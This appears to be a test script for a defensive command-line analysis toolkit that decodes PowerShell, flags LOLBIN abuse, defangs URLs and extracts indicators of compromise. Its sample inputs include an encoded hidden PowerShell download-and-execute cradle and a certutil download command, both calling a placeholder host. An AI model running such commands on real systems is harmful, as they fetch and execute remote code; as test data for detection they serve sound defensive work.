import fs from 'fs';
import * as mod from './tools.js';

const src = fs.readFileSync('C:/Users/Carl/Desktop/Projects/CARL/src/carl-tools.js', 'utf8');
function grab(name) {
  const m = src.match(new RegExp(name + ': (\\{[\\s\\S]*?\\n  \\}),\\n'));
  return eval('(' + m[1] + ')');
}
for (const n of ['PS_FLAG_MAP', 'PS_RISK_FLAGS', 'LOLBIN_DB']) {
  console.log(n, 'deep equal:', JSON.stringify(grab(n)) === JSON.stringify(mod[n]));
}
const srcPatterns = grab('_patterns');
for (const k of Object.keys(srcPatterns)) {
  console.log('pattern', k, 'identical:', String(srcPatterns[k]) === String(mod.patterns[k]));
}

const b64 = btoa(String.fromCharCode(...[..."IEX (New-Object Net.WebClient).DownloadString('http://x/a')"].flatMap(c => [c.charCodeAt(0), 0])));
console.log('smartDecode:', JSON.stringify(mod.smartDecodeBase64(b64)));
const p = mod.psParseCommandLine('powershell.exe -nop -w hidden -enc ' + b64);
console.log('ps:', p.binary, p.risk, p.flags.map(f => f.resolved).join(' | '));
console.log('ps decoded:', p.decodedPayload);
const l = mod.lolbinAnalyze('certutil.exe -urlcache -split -f http://x/a');
console.log('lolbin:', l.binary, l.entry.risk, l.entry.mitre, 'flags:', l.flagsFound.map(f => f.flag).join(','));
const url = 'https://evil.com/path';
const ip = '185.220.101.42';
console.log('defang url:', mod.defang(url), '-> roundtrip ok:', mod.refang(mod.defang(url)) === url);
console.log('defang ip:', mod.defang(ip), '-> roundtrip ok:', mod.refang(mod.defang(ip)) === ip);
const iocs = mod.extractIOCs('Host 185.220.101.42 beaconed to bad-domain.com, hash e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 exploiting CVE-2026-31245.');
console.log('iocs:', JSON.stringify(iocs));
console.log('smartDecode utf8:', JSON.stringify(mod.smartDecodeBase64(btoa('plain ascii utf-8 payload here'))));
